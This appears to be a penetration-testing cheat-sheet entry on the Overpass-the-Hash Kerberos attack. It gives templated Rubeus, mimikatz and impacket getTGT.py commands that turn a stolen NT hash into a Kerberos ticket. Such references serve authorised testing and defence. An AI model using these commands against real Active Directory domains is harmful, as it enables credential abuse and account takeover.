---
technique: Overpass the Hash
category: kerberos
targets: Domain users
protocols: Kerberos
remote_capable: true
tags: kerberos overpass-the-hash opth rc4 nt-hash tgt ad
---

# Overpass the Hash

Overpass the Hash is a specific form of Pass-the-Key where the RC4 Kerberos key, which is identical to the user's NT hash, is used to request a TGT. Unlike Pass-the-Hash (which abuses NTLM directly), Overpass-the-Hash converts an NT hash into a full Kerberos TGT, enabling access to Kerberos-only services and avoiding NTLM-specific detections. When RC4 is disabled, the equivalent technique using AES keys is called Pass-the-Key.

## Windows

### Rubeus

#powershell #rc4 #tgt

Request a Kerberos TGT using an NT hash and inject it into the session.

```powershell title:"Request TGT from NT hash via Rubeus (overpass-the-hash)"
.\Rubeus.exe asktgt /domain:"$domain" /user:"$user" /rc4:"$nt_hash" /ptt
```
<!-- cheat
import domain_ip
import users
var nt_hash
-->

### mimikatz sekurlsa::pth

#c #rc4 #spawn-process

Spawn a new process authenticated with a stolen NT hash via Kerberos.

```cmd title:"Spawn authenticated process from NT hash via mimikatz"
sekurlsa::pth /user:$user /domain:$domain /rc4:$nt_hash /ptt
```
<!-- cheat
import domain_ip
import users
var nt_hash
-->

## Linux

### getTGT.py

#impacket #rc4 #tgt

Convert an NT hash into a Kerberos TGT using getTGT.py.

```sh title:"Convert NT hash to Kerberos TGT via getTGT"
getTGT.py -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash" "$domain/$user"
```
<!-- cheat
import domain_ip
import users
var nt_hash
-->
